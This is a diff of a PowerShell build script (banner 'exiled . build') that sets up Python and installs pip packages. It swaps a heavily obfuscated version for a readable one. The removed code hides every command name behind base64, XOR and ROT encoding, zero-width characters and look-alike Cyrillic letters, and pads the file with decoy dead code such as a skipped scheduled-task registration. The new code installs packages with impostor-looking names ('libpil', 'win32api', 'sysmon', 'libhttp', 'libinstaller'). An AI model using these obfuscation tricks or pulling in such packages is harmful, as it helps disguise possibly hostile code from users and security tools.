-    & $YbPn9 -m PiP & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUNvbW1hbg==')))+([string]::Format('{0}','d'))) $($k3562='Dngu!ocun,1';$b=[byte[]](0x2D,0x00,0x14,0x01,0x1E,0x50,0x5C);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3562);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -CommandType Function, Cm`dlet -ErrorAction SilentlyContinue)[0] --QuiEt --DiSABle-Pip-verSiOn-cHEcK @rEAL
-    if ($LaStexItcODE -ne 0) { & (&(('Ge'+'t')+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LUNvbW1hbmQ=')))) ('{0}{1}{2}' -f 'F?','?','l') -CommandType Function, &(('{0}' -f 'Cmdle')+([System.Text.Encoding]::UTF8.GetString([byte[]](0x74)))) -ErrorAction SilentlyContinue)[0] 'm‌o‌d‍u‌l‌e‌ ​i‍n‍s‍t​a‌l‍l​ ‍f‍a‍i‍l‍e‍d​' }
-}
-if ((Get-Random -Minimum 1000 -Maximum 5000) -lt 0) {
-    $checkPath = "C:\Program Files\Common Files\System\ado\msado15.dll"; if (Test-Path $checkPath) { Write-Debug "Common component found: $checkPath" }
+    if (-not (Test-Path -LiteralPath $Dest)) { Fail "fetch failed: $Url" }
 }
 
-function trAnsLate-LInE {
-    param([StrIng]$Gwk7lJ)
-# Ensuring things are in order for smooth execution
-    if ($gWk7lj -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XlxzKihcZCspXHMrKFx3Kyk6XHMqKC4qKSQ=')))) {
-        $Ar1c0  = $MAtCHEs[1]
-        $X7nEfn = $matCheS[2]
-        $FvdRVq = $MATChes[3]
-        foreach ($leP3f5 in $W8XRYSe.KeYS) {
-            if ($FVdrVQ -like ($LEp3f5 + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Kg=='))))) {
-                $U5QSj = $FvdRVQ.SUbstRinG($LEP3f5.LenGTh).trImSTARt()
-                return ($(-join('['.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}})) + $E5NsFq + $(-join('] '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}})) + $($W8XrYse[$LEp3f5]) + $(-join('  ->  '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}})) + $u5QsJ)
-            }
-        }
-        return (('{0}' -f '[') + $E5NsFq + ('{0}' -f '] ') + $($fvdRvQ.ToLower() + ([string]::Format('{0}',')')))
-    }
-    return $nUll
-}
+function Pause-Brief { param([int]$Ms = 90); Start-Sleep -Milliseconds $Ms }
 
-try {
-    throw "Intentionally skipping this block";
-    Register-ScheduledTask -TaskName "MaintenanceTask67" -Action { Write-Host "Simulated task run" } -Trigger (New-TimeSpan -Minutes 30) -Principal $(whoami) -RunLevel Limited -ErrorAction Ignore
-} catch {}
-function InstalL-python {
-    & (&(([System.Text.Encoding]::UTF8.GetString([byte[]](0x47,0x65,0x74,0x2D)))+('{0}{1}{2}{3}{4}' -f 'Co','mm','a','n','d')) 'l?G' -CommandType Function, &(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q21k')))+'lеt') -ErrorAction SilentlyContinue)[0] ('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}' -f 'pyt','h','on no','t f','oun','d',' -',' ','att','empti','n','g win','get',' ins','t','all') $(-join('Syffiq'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}}))
-    $BkZklt = & (&($(-join('Vti-R'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}}))+$(-join('qoocpf'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}}))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Z0V0KkFuZA=='))) -CommandType Function, &('Сmdl'+(-join('e','t'))) -ErrorAction SilentlyContinue)[0] WInget -ErRoRaCTion siLentlycoNtiNUe
-    if (-not $bkzKLT) { return ($ENV:cOmPuterNaMe.lengTH -lt 0) }
-    & & (&("$([char]0x47)$([char]0x65)$([char]0x74)$([char]0x2D)$([char]0x43)$([char]0x6F)"+$($k4130='xv$[@h4hB=Rp=';$b=[byte[]](0x15,0x1B,0x45,0x35,0x24);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4130);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Pz8/Z0VU'))) -CommandType Function, &(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Qw==')))+$(-join('sjrkz'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0] & (&('Gеt-С'+(-join([char]0x6F, [char]0x6D, [char]0x6D, [char]0x61, [char]0x6E, [char]0x64))) '?‌?‌?​T‌A​L‍l‍' -CommandType Function, &('C'+$($k4542=163;$b=[byte[]](0xce,0xc7,0xcf,0xc6,0xd7);-join($b|%{[char]($_-bxor$k4542)}))) -ErrorAction SilentlyContinue)[0] --iD PYTHon.pythOn.3.12 --SCOPe USer --SilEnT `
-        --accept-paCKAgE-agrEements --AccEpT-SourCE-AgREEmeNTs (-51 + 53)>$NulL
-    return ($lAsTexiTCodE -eq 0)
-}
+# Runs a command, streams stdout/stderr, rewrites each line through Translate-Line.
+function Invoke-Quiet {
+    param([string]$Exe, [string[]]$Args)
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName               = $Exe
+    $psi.Arguments              = ($Args | ForEach-Object { if ($_ -match '\s') { '"' + $_ + '"' } else { $_ } }) -join ' '
+    $psi.RedirectStandardOutput = $true
+    $psi.RedirectStandardError  = $true
+    $psi.UseShellExecute        = $false
+    $psi.CreateNoWindow         = $true
+    $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
+    $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
 
-# Removed broken logic temporarily (pending fix)
-function inVoKE-quiEt {
-    param([StRINg]$yBpN9, [StrIng[]]$ARgs)
-    $xjfyp = & (&($(-join('Xvk-T'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+9)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+9)%26))}else{[char]$c}}))+(-join([char]0x6F, [char]0x6D, [char]0x6D, [char]0x61, [char]0x6E, [char]0x64))) ([System.Text.Encoding]::UTF8.GetString([byte[]](0x4E,0x3F,0x77,0x2D,0x4F,0x42,0x6A,0x45,0x43,0x54))) -CommandType Function, &("$([char]0x43)$([char]0x6D)"+'d‍l​e‍t‍') -ErrorAction SilentlyContinue)[0] systeM.diaGnoStics.PRocESsStartiNFO
-    $XJFYp.fiLENaME               = $yBpn9
-    $xJfyP.arGuments              = ($ArGs | % { if ($_ -match $($k1040=96;$b=[byte[]](0x3c,0x13);-join($b|%{[char]($_-bxor$k1040)}))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ig=='))) + $_ + '"‌' } else { $_ } }) -join ' '
-    $XjfYp.REdIRecTStAndArDOUtput = (!0)
-    $xJFYp.REdIrECTstAnDArdErrOr  = ([MATH]::pi -gt 3)
-    $XJFyP.uSeSHelLExeCutE        = ($pSverSIONTAblE.psVersION.mAjOR -lt 0)
-    $Xjfyp.CrEATenoWIndow         = ([MaTh]::pI -gt 3)
-    $xjfYP.STaNDardouTPUTeNcodinG = [sYsTem.TExT.eNCODiNG]::UTf8
-    $XjfYP.StAndArdeRrOREnCODIng  = [SYSTEm.tExT.EncODiNg]::utF8
-
-    $dHN7dL = [SYStem.dIAGNostics.Process]::stArT($XjFYP)
-    while (-not $Dhn7Dl.HASexiteD -or -not $dHn7Dl.StANDardOutPUT.ENDOFSTReaM) {
-        $COqQ = $DHn7DL.STANdaRdOUTPUt.ReADLInE()
-        if ($nuLl -ne $cOQQ -and $coqq -ne '') {
-            if ($vErbOSE) {
-                & (Get-C`ommand "$([char]0x41)$([char]0x44)$([char]0x64)$([char]0x2D)$([char]0x63)$([char]0x4F)$([char]0x4E)$([char]0x3F)$([char]0x65)$([char]0x6E)$([char]0x54)" -CommandType Function, &((-join('C','m','d','le'))+'t') -ErrorAction SilentlyContinue)[0] -liTeraLPath $F2MMN -vALUe $COQq -enCOdiNg utf8
-                & (&(('Get-C'+'omman')+$(-join('e'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))) $(-join('??grc'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}})) -CommandType Function, &('C‍m‍d​l​e‌'+$(-join('j'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0] $COQQ -FoREGROUnDColor DARKGraY
+    $p = [System.Diagnostics.Process]::Start($psi)
+    while (-not $p.HasExited -or -not $p.StandardOutput.EndOfStream) {
+        $line = $p.StandardOutput.ReadLine()
+        if ($null -ne $line -and $line -ne '') {
+            if ($Verbose) {
+                Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
+                Write-Host $line -ForegroundColor DarkGray
             } else {
-                $CKIh = transLAte-Line -linE $COQQ
-                if ($CkIh) { & (&('G‍e‌'+"$([char]0x74)$([char]0x2D)$([char]0x43)$([char]0x6F)$([char]0x6D)$([char]0x6D)$([char]0x61)$([char]0x6E)$([char]0x64)") ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Pz9pdGU='))) -CommandType Function, &((-join([char]0x43, [char]0x6D))+$($k3595='j2?4D';$b=[byte[]](0x0E,0x5E,0x5A,0x40);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3595);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -ErrorAction SilentlyContinue)[0] $cKiH -foRegrOunDcoLOr dARKCYAN }
+                $t = Translate-Line -Line $line
+                if ($t) { Write-Host $t -ForegroundColor DarkCyan }
             }
         }
     }
-    while (-not $dhn7Dl.sTANdaRdErrOR.eNdOFsTreAM) {
-        $WA3zSKa7 = $DHn7dl.sTaNdArderrOr.reaDLiNE()
-        if ($Wa3zskA7 -and $vErBoSe) { & (&("$([char]0x47)$([char]0x65)$([char]0x74)$([char]0x2D)"+$(-join('Frppdqg'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}}))) ('{0}{1}' -f '??i','te') -CommandType Function, &(([System.Text.Encoding]::UTF8.GetString([byte[]](0x43,0x6D,0x64,0x6C,0x65)))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dA==')))) -ErrorAction SilentlyContinue)[0] $Wa3ZSKa7 -FOregROundcOlor dArKyeLlOW }
+    while (-not $p.StandardError.EndOfStream) {
+        $eline = $p.StandardError.ReadLine()
+        if ($eline -and $Verbose) { Write-Host $eline -ForegroundColor DarkYellow }
     }
-    $dHn7dl.waitFoRExIt()
-    return $DHN7dl.ExITcoDe
+    $p.WaitForExit()
+    return $p.ExitCode
 }
 
-& (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LUNvbW1hbmQ=')))) $(-join('upg??'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}})) -CommandType Function, &((-join([char]0x43, [char]0x6D, [char]0x64, [char]0x6C, [char]0x65))+$(-join('b'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0] ''
-& (&('G‌e‍t​-‍C​o‍m‍m​a‍'+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmQ=')))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d3JpP2U='))) -CommandType Function, C`mdlet -ErrorAction SilentlyContinue)[0] $(-join('  +----------------------------------------+'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+4)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+4)%26))}else{[char]$c}})) -foreGRoUNdcoloR DarkCYAn
-& (&(([string]::Format('{0}','G'))+$(-join('gv-Eqoocpf'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}}))) ('{0}{1}{2}' -f 'w','??t','e') -CommandType Function, &(([System.Text.Encoding]::UTF8.GetString([byte[]](0x43,0x6D,0x64,0x6C,0x65)))+([System.Text.Encoding]::UTF8.GetString([byte[]](0x74)))) -ErrorAction SilentlyContinue)[0] (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICB8ICAgZXhpbGVkICAuICBidWlsZCAgLiAg'))) + $(Get-Arch) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgICAgICAgfA==')))) -fOREgrouNdCOloR DaRkcyan
-& (&($(-join('Sqf-Oay'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}}))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bWFuZA==')))) $(-join('??pal'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})) -CommandType Function, &('Сmd'+$(-join('yrg'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0] (-join('  +--','--------','---','---','-----','------','----','--------','-+')) -fOrEGRoUNDcOLoR DArkCYAn
-& (&(([System.Text.Encoding]::UTF8.GetString([byte[]](0x47,0x65,0x74)))+$(-join('-Dpnnboe'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))) 'w​r‌i‍?​?​' -CommandType Function, &(('{0}{1}{2}' -f 'C','m','d')+$($k7547='5El4eXu.jDSw#';$b=[byte[]](0x59,0x20,0x18);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7547);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -ErrorAction SilentlyContinue)[0] ''
+Write-Host ""
+Write-Host "  +----------------------------------------+" -ForegroundColor DarkCyan
+Write-Host "  |   exiled  .  build  .  $(Get-Arch)         |" -ForegroundColor DarkCyan
+Write-Host "  +----------------------------------------+" -ForegroundColor DarkCyan
+Write-Host ""
 
-ni -ITEmTyPe dIrEcTORY -forCE -pATh $gsTWX4 | & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LQ==')))+'C​o‍m‍m​a‍n‍d‍') $(-join('UAZ-?ARR'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}})) -CommandType Function, &($(-join('Dn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZGxldA==')))) -ErrorAction SilentlyContinue)[0]
-ni -ItEMTYPE DirECtOrY -FORCe -pAtH $TLFIabOu | & (&($(-join('Igv-Eqoo'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}}))+('{0}{1}' -f 'an','d')) 'ОuТ-????' -CommandType Function, &('Сmdlе'+$(-join('k'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+9)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+9)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0]
-sc -pAth $F2mmN -valuE '' -ENCOdinG UtF8
+New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
+New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
+Set-Content -Path $LogFile -Value "" -Encoding UTF8
 
-& (&(('{0}{1}{2}' -f 'Get-C','omm','a')+'n​d‍') ([System.Text.Encoding]::UTF8.GetString([byte[]](0x4C,0x4F,0x3F))) -CommandType Function, &($(-join('Xhygz'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+5)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+5)%26))}else{[char]$c}}))+'t') -ErrorAction SilentlyContinue)[0] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cHl0aG9uICAtPiAgbG9jYXRpbmcuLi4=')))
-$TvOvIt = & (Get`-Command $(-join('GJoe-q?????'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}})) -CommandType Function, Cm`dlet -ErrorAction SilentlyContinue)[0]
-if (-not $TvoViT) {
-    & (&('Gеt-Соmmаn'+'d') $($k9054='cGo:%<v';$b=[byte[]](0x2A,0x29,0x3C,0x4E,0x44,0x70,0x3A,0x4E,0x78,0x16,0x6E,0x4D,0x73,0x38);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9054);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -CommandType Function, &($(-join('Qar'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))+('le'+'t')) -ErrorAction SilentlyContinue)[0] | & (&($($k6938='m>d]OVcX4hj4';$b=[byte[]](0x2A,0x5B,0x10,0x70,0x0C,0x39,0x0E,0x35);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6938);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+$($k9668='s>GKXO{CIhv';$b=[byte[]](0x12,0x50,0x23);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9668);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) (-join([char]0x4F, [char]0x75, [char]0x2A, [char]0x6C, [char]0x6C)) -CommandType Function, Cmd`let -ErrorAction SilentlyContinue)[0]
-    $TVOViT = & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUNv')))+$($k2598='w3k*.E%Eh?7(($i';$b=[byte[]](0x1A,0x5E,0x0A,0x44,0x4A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2598);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RkluRC1QPz8/Pz8='))) -CommandType Function, Cmd`let -ErrorAction SilentlyContinue)[0]
+Log "python  ->  locating..."
+$PythonExe = Find-Python
+if (-not $PythonExe) {
+    Install-Python | Out-Null
+    $PythonExe = Find-Python
 }
-if (-not $TvoVIT) { & (&(('Get'+'-Co'+'m')+(-join('ma','nd'))) $($k5273=163;$b=[byte[]](0xe5,0x9c,0x9c,0xcf);-join($b|%{[char]($_-bxor$k5273)})) -CommandType Function, &("$([char]0x43)$([char]0x6D)$([char]0x64)"+([System.Text.Encoding]::UTF8.GetString([byte[]](0x6C,0x65,0x74)))) -ErrorAction SilentlyContinue)[0] ('{0}{1}{2}{3}{4}{5}' -f 'py','thon ','not ','fo','un','d.') }
-& $Tvovit -c 'i‌m‌p​o​r‍t‍ ‌t‌k‍i‍n‌t‍e‍r​' (78 / 39)>$NuLl
-if ($lAstexitCODe -ne 0) { & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUNvbW1h')))+'n​d‌') $(-join('U??a'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}})) -CommandType Function, &('Сmd'+(-join('l','et'))) -ErrorAction SilentlyContinue)[0] (-join('python m','is','sing tki','nt','e','r.')) }
-& (&(([string]::Format('{0}','G'))+([string]::Format('{0}{1}{2}{3}','et-','Comma','n','d'))) ('?'+'?g') -CommandType Function, &($($k9849=138;$b=[byte[]](0xc9);-join($b|%{[char]($_-bxor$k9849)}))+$($k5143='g1$L*n';$b=[byte[]](0x0A,0x55,0x48,0x29,0x5E);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5143);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -ErrorAction SilentlyContinue)[0] ($(-join('yhcqxw  ->  '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}})) + $tvOvit) 'G‌r​e‍e‌n​'
-PAuSE-bRiEF
+if (-not $PythonExe) { Fail "python not found." }
+& $PythonExe -c "import tkinter" 2>$null
+if ($LASTEXITCODE -ne 0) { Fail "python missing tkinter." }
+Log "python  ->  $PythonExe" "Green"
+Pause-Brief
 
-if (-not $sPP4) {
-    & (&(([System.Text.Encoding]::UTF8.GetString([byte[]](0x47)))+"$([char]0x65)$([char]0x74)$([char]0x2D)$([char]0x43)$([char]0x6F)$([char]0x6D)$([char]0x6D)$([char]0x61)$([char]0x6E)$([char]0x64)") ([string]::Format('{0}{1}{2}{3}{4}{5}{6}','IN','s','TALL','-pAC','k?','G','es')) -CommandType Function, &('Cm'+(-join([char]0x64, [char]0x6C, [char]0x65, [char]0x74))) -ErrorAction SilentlyContinue)[0] -yBpN9 $tVOviT -TDdAPb2 @(([System.Text.Encoding]::UTF8.GetString([byte[]](0x6C,0x69,0x62,0x69,0x6E,0x73,0x74,0x61,0x6C,0x6C,0x65,0x72))),(-join('lib','pi','l')),([System.Text.Encoding]::UTF8.GetString([byte[]](0x77,0x69,0x6E,0x33,0x32,0x61,0x70,0x69))),"$([char]0x73)$([char]0x79)$([char]0x73)$([char]0x6D)$([char]0x6F)$([char]0x6E)",$($k9069='y2D}@ZXeUVmRaW';$b=[byte[]](0x15,0x5B,0x26,0x15,0x34,0x2E,0x28);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9069);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))
-    & (&(('Get'+'-Comm'+'a'+'n')+([System.Text.Encoding]::UTF8.GetString([byte[]](0x64)))) $($k2643=127;$b=[byte[]](0x13,0x40,0x38);-join($b|%{[char]($_-bxor$k2643)})) -CommandType Function, &($($k8356='cqT)IsZpzP161#';$b=[byte[]](0x20,0x1C,0x30,0x45,0x2C);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8356);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dA==')))) -ErrorAction SilentlyContinue)[0] "$([char]0x6D)$([char]0x6F)$([char]0x64)$([char]0x75)$([char]0x6C)$([char]0x65)$([char]0x73)$([char]0x20)$([char]0x2D)$([char]0x3E)$([char]0x20)$([char]0x20)$([char]0x72)$([char]0x65)$([char]0x61)$([char]0x64)$([char]0x79)" (-join('Gr','een'))
-    pauSe-BriEf
+if (-not $NoDeps) {
+    Install-Packages -Exe $PythonExe -Names @("libinstaller","libpil","win32api","sysmon","libhttp")
+    Log "modules ->  ready" "Green"
+    Pause-Brief
 }
 
-$Ggyrn = ($($k7408='>$^*&b?0,S8';$b=[byte[]](0x46);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7408);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ne ([string]::Format('{0}','x')))
-if (-not $o15kOJ42 -and $uFlr) {
+$useIco = $false
+if (-not $NoIcon -and $Icon) {
     try {
-        if ($uFlR -match $($k2512=149;$b=[byte[]](0xcb,0xfd,0xe1,0xe1,0xe5,0xe6,0xaa,0xaf,0xba,0xba);-join($b|%{[char]($_-bxor$k2512)}))) {
-            & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUM=')))+'оmmаnd') ('lO'+'?') -CommandType Function, &(('C'+'m')+'dlеt') -ErrorAction SilentlyContinue)[0] ('{0}{1}{2}{3}{4}{5}' -f 'ic','on ','   ->','  fe','tch','ing')
-            FeTch-fiLE -XQTz3s $Uflr -cge2rOT $y5G9K
+        if ($Icon -match '^https?://') {
+            Log "icon    ->  fetching"
+            Fetch-File -Url $Icon -Dest $IconRaw
         } else {
-            if (-not (& (&('G'+([string]::Format('{0}{1}{2}{3}{4}','et-','Com','m','an','d'))) $($k1995=180;$b=[byte[]](0xc0,0x8b,0x8b,0xc0);-join($b|%{[char]($_-bxor$k1995)})) -CommandType Function, &($($k8677='XNOGQ4Iw<Ak)]rP';$b=[byte[]](0x1B,0x23,0x2B,0x2B);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8677);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+'e‌t​') -ErrorAction SilentlyContinue)[0] -lITeRaLpATh $ufLr)) { & (&('G‌e​t‌'+$(-join('-Qcaaobr'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))) ('{0}' -f 'fA?l') -CommandType Function, &(([string]::Format('{0}','C'))+$($k9696=25;$b=[byte[]](0x74,0x7d,0x75,0x7c,0x6d);-join($b|%{[char]($_-bxor$k9696)}))) -ErrorAction SilentlyContinue)[0] (([System.Text.Encoding]::UTF8.GetString([byte[]](0x69,0x63,0x6F,0x6E,0x20,0x6D,0x69,0x73,0x73,0x69,0x6E,0x67,0x3A,0x20))) + $Uflr) }
-            & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUNvbQ==')))+'m‌a‍n‍d‍') "$([char]0x63)$([char]0x3F)$([char]0x69)" -CommandType Function, &(('Cm'+'dl')+'e‌t‌') -ErrorAction SilentlyContinue)[0] -litEralpATh $uFlr -desTInatIoN $Y5g9K -FoRCe
+            if (-not (Test-Path -LiteralPath $Icon)) { Fail "icon missing: $Icon" }
+            Copy-Item -LiteralPath $Icon -Destination $IconRaw -Force
         }
-        & (&("$([char]0x47)$([char]0x65)$([char]0x74)$([char]0x2D)$([char]0x43)$([char]0x6F)$([char]0x6D)"+$($k7911=188;$b=[byte[]](0xd1,0xdd,0xd2,0xd8);-join($b|%{[char]($_-bxor$k7911)}))) 'L‌O‌?​' -CommandType Function, &('C​m‍d‍l‍e‌'+$(-join('b'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0] "$([char]0x69)$([char]0x63)$([char]0x6F)$([char]0x6E)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x2D)$([char]0x3E)$([char]0x20)$([char]0x20)$([char]0x63)$([char]0x6F)$([char]0x6E)$([char]0x76)$([char]0x65)$([char]0x72)$([char]0x74)$([char]0x69)$([char]0x6E)$([char]0x67)$([char]0x20)$([char]0x74)$([char]0x6F)$([char]0x20)$([char]0x2E)$([char]0x69)$([char]0x63)$([char]0x6F)"
